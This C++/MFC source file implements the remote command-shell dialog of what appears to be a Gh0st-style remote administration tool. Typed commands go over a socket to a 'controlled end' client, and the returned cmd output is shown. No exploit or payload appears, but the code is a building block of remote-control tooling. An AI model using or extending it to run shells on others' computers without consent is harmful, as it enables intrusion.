// CmdManagerDlg.cpp: 实现文件
//

#include "pch.h"
#include "Server.h"
#include "CmdManagerDlg.h"
#include "afxdialogex.h"


// CCmdManagerDlg 对话框

IMPLEMENT_DYNAMIC(CCmdManagerDlg, CDialog)

CCmdManagerDlg::CCmdManagerDlg(CWnd* pParent, _CIOCPServer*
	IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_CMD_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;        //通信对象
	m_ContextObject = ContextObject;  //上下背景文

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));  //Icon

}

CCmdManagerDlg::~CCmdManagerDlg()
{

}



void CCmdManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD_MAIN, m_CEdit_Cmd_Main);
}


BEGIN_MESSAGE_MAP(CCmdManagerDlg, CDialog)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CCmdManagerDlg 消息处理程序
//初始化窗口
BOOL CCmdManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	m_ShowDataLength = 0;
	m_911 = 0;

	// TODO:  在此添加额外的初始化
	SetIcon(m_IconHwnd, FALSE);   //设置忍者图标到Dialog
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);

	BOOL IsOk = INVALID_SOCKET;
	if (m_ContextObject != NULL)
	{
		IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	}
	v1.Format("%s - Cmd管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "本地");
	SetWindowText(v1);//设置对话框标题

	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnClientPreSending(m_ContextObject, &IsToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CCmdManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	ShowClientCmdData();
	m_ShowDataLength = m_CEdit_Cmd_Main.GetWindowTextLength();
}

VOID CCmdManagerDlg::ShowClientCmdData(void)
{
	m_ContextObject->m_InDeCompressedBufferData.WriteArray((LPBYTE)"", 1);
	//从被控制端来的数据我们要加上一个\0
	CString v1 = (char*)m_ContextObject->m_InDeCompressedBufferData.GetArray(0);
	//获得所有的数据 包括 \0																			 
	v1.Replace("\n", "\r\n");
	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行  	
	//得到当前窗口的字符个数
	int	BufferLength = m_CEdit_Cmd_Main.GetWindowTextLength();
	//将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
	m_CEdit_Cmd_Main.SetSel(BufferLength, BufferLength);

	//用传递过来的数据替换掉该位置的字符    //显示
	m_CEdit_Cmd_Main.ReplaceSel(v1);          //HelloShit
	//重新得到字符的大小
	m_911 = m_CEdit_Cmd_Main.GetWindowTextLength();   //C:\>dir
   //我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
  //要找到这个回车的处理我们就要到PreTranslateMessage函数的定义  
}

void CCmdManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		//这个太重要了
		m_ContextObject->DlgHandle = NULL;
		m_ContextObject->DlgID = 0;
	}
	CDialog::OnClose();
}

BOOL CCmdManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_CEdit_Cmd_Main.m_hWnd)
		{
			//得到窗口的数据大小
			int	BufferLength = m_CEdit_Cmd_Main.GetWindowTextLength();  //C:\>dir
			CString BufferData;
			//得到窗口的字符数据
			m_CEdit_Cmd_Main.GetWindowText(BufferData);//dir\r\n  
									  //加入换行符
			BufferData += "\r\n";
			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去。。。。。。。。。。。。。。。
			m_IOCPServer->OnClientPreSending(m_ContextObject, (LPBYTE)BufferData.GetBuffer(0) + m_911,
				BufferData.GetLength() - m_911);
			m_911 = m_CEdit_Cmd_Main.GetWindowTextLength();  //重新定位m_nCurSel  m_nCurSel = 3
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_CEdit_Cmd_Main.m_hWnd)
		{
			if (m_CEdit_Cmd_Main.GetWindowTextLength() <= m_ShowDataLength)
				return true;
		}
	}
	//发个系统
	return CDialog::PreTranslateMessage(pMsg);
}




HBRUSH CCmdManagerDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	// TODO:  在此更改 DC 的任何特性
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_CMD_MAIN) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF ColorReference = RGB(255, 255, 255);
		pDC->SetTextColor(ColorReference);   //设置白色的文本
		ColorReference = RGB(0, 0, 0);
		pDC->SetBkColor(ColorReference);     //设置黑色的背景
		return CreateSolidBrush(ColorReference);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}
